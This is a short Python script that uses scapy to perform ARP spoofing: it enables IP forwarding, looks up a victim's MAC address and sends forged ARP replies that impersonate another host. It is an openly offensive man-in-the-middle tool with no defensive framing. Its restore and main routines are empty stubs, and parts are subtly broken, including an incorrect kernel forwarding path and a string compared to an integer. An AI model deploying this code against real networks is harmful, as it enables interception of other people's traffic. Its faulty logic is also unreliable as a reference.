import os

from scapy.layers.l2 import ARP, Ether, srp
from scapy.sendrecv import send


def _enable_linux_iproute():
    file_path = '/proc/sys/net/ip4/ip_forward'
    with open(file_path) as f:
        if f.read() == 1:
            return

    with open(file_path, 'w') as f:
        print(1, file=f)


def _enable_windows_iproute():
    from services import WinService
    service = WinService("RemoteAccess")
    service.start()


def enable_ip_route(verbose=True):
    if verbose:
        print('[!] Enabling IP Routing...', end=' ')

    _enable_windows_iproute() if 'nt' in os.name else _enable_linux_iproute()

    if verbose:
        print('ok')


def get_mac(ip):
    arp = ARP(pdst=ip)
    eth = Ether(dst='ff:ff:ff:ff:ff:ff')
    pkt = eth / arp
    ans, _ = srp(pkt, timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print('[+] sent to {}: {} @ {}'.format(target_ip, host_ip, self_mac))


def restore(target, host, verbose=True):
    pass


if __name__ == '__main__':
    pass
